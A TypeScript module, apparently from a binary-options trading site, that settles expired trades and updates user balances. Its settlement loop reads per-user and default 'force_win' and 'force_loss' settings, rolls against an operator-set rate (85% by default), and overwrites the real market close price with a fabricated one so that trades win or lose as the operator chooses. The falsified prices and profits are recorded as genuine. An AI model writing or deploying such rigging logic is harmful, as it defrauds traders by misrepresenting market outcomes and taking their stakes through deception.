import { prisma } from "./prisma";
import { getPrice, tickPrice } from "./prices";

export async function settleExpiredTrades(userId?: string) {
  const now = new Date();
  const openTrades = await prisma.trade.findMany({
    where: {
      status: "open",
      expiresAt: { lte: now },
      ...(userId ? { userId } : {}),
    },
    include: {
      user: {
        select: {
          manipulation: true,
          winRate: true,
        },
      },
    },
  });

  if (openTrades.length === 0) return;

  const marketSetting = await prisma.marketSetting.findUnique({
    where: { id: "default" },
  });
  const defaultForceWinRate = marketSetting?.forceWinRate ?? 85.0;
  const defaultForceLossRate = marketSetting?.forceLossRate ?? 85.0;

  for (const trade of openTrades) {
    const originalClosePrice = await getPrice(trade.assetId);
    let closePrice = originalClosePrice;
    let won = false;

    const userManipulation = trade.user?.manipulation ?? marketSetting?.manipulation ?? "normal";
    const userWinRate = trade.user?.winRate;

    if (userManipulation === "force_win") {
      const winProbability = userWinRate !== null && userWinRate !== undefined ? userWinRate : defaultForceWinRate;
      const roll = Math.random() * 100;
      if (roll <= winProbability) {
        won = true;
        if (trade.direction === "up") {
          closePrice = Math.max(originalClosePrice, trade.openPrice + 0.05);
        } else {
          closePrice = Math.min(originalClosePrice, trade.openPrice - 0.05);
        }
      } else {
        won = false;
        if (trade.direction === "up") {
          closePrice = Math.min(originalClosePrice, trade.openPrice - 0.05);
        } else {
          closePrice = Math.max(originalClosePrice, trade.openPrice + 0.05);
        }
      }
    } else if (userManipulation === "force_loss") {
      const lossProbability = userWinRate !== null && userWinRate !== undefined ? userWinRate : defaultForceLossRate;
      const roll = Math.random() * 100;
      if (roll <= lossProbability) {
        won = false;
        if (trade.direction === "up") {
          closePrice = Math.min(originalClosePrice, trade.openPrice - 0.05);
        } else {
          closePrice = Math.max(originalClosePrice, trade.openPrice + 0.05);
        }
      } else {
        won = true;
        if (trade.direction === "up") {
          closePrice = Math.max(originalClosePrice, trade.openPrice + 0.05);
        } else {
          closePrice = Math.min(originalClosePrice, trade.openPrice - 0.05);
        }
      }
    } else {
      won =
        trade.direction === "up"
          ? closePrice > trade.openPrice
          : closePrice < trade.openPrice;
    }

    const profit = won ? trade.stake * (trade.payout / 100) : -trade.stake;

    const claim = await prisma.trade.updateMany({
      where: { id: trade.id, status: "open" },
      data: {
        status: won ? "won" : "lost",
        closePrice,
        profit,
        settledAt: now,
      },
    });

    if (claim.count === 0) {
      continue;
    }

    if (won) {
      await prisma.user.update({
        where: { id: trade.userId },
        data: { balance: { increment: trade.stake + profit } },
      });
    }
  }
}

export async function settleAndFetchTrades(userId: string) {
  await settleExpiredTrades(userId);
  return prisma.trade.findMany({
    where: { userId },
    orderBy: { createdAt: "desc" },
    take: 100,
  });
}

export { tickPrice };